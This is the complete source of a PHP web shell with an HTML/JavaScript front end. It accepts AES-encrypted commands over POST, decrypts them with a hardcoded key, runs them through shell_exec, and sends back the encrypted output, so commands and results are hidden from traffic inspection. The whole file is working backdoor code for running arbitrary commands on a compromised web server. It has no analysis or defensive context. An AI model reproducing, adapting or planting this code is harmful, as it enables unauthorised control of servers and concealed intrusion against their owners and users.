<?php
$original_key = "s3cr3tk3y1234567";
$key = base64_encode(bin2hex(base64_decode(base64_encode($original_key))));
function encrypt($data, $key) {
    return base64_encode(openssl_encrypt($data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $key));
}
function decrypt($data, $key) {
    return openssl_decrypt(base64_decode($data), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $key);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $encryptedCommand = $_POST['cmd'];
    $decodedCommand = decrypt($encryptedCommand, $key);

    if ($decodedCommand === false) {
        echo encrypt("Decryption failed!", $key);
        exit;
    }

    $output = shell_exec($decodedCommand);
    if ($output === null) {
        $output = "Command execution failed or no output.";
    }

    echo encrypt($output, $key);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        textarea {
            width: 100%;
            height: 100px;
        }
        .output {
            width: 100%;
            height: 200px;
            margin-top: 10px;
            overflow-y: scroll;
            background: #f9f9f9;
            border: 1px solid #ccc;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>Webshell</h1>
    <h2>Execute Command</h2>
    <form id="commandForm">
        <textarea id="command" placeholder="Enter command"></textarea>
        <button type="button" onclick="executeCommand()">Run</button>
    </form>
    <div class="output" id="commandOutput"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script>
        const originalKey = "s3cr3tk3y1234567";
        const key = btoa(
            Array.from(
                atob(btoa(originalKey))
            )
            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
            .join('')
        );

        function encrypt(data, key) {
            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16)); 
            return CryptoJS.AES.encrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            }).toString();
        }

        function decrypt(data, key) {
            const iv = CryptoJS.enc.Utf8.parse(key.substring(0, 16));
            const bytes = CryptoJS.AES.decrypt(data, CryptoJS.enc.Utf8.parse(key.substring(0, 16)), {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });
            return bytes.toString(CryptoJS.enc.Utf8);
        }

        async function executeCommand() {
            const command = document.getElementById("command").value;
            if (!command.trim()) {
                alert("Please enter a command.");
                return;
            }
            const encryptedCommand = encrypt(command, key);
            const formData = new FormData();
            formData.append("cmd", encryptedCommand);

            try {
                const response = await fetch("webshell.php", { method: "POST", body: formData });
                const encryptedOutput = await response.text();
                const decryptedOutput = decrypt(encryptedOutput, key);
                document.getElementById("commandOutput").innerText = decryptedOutput;
            } catch (error) {
                document.getElementById("commandOutput").innerText = "Error executing command.";
            }
        }
    </script>
</body>
</html>
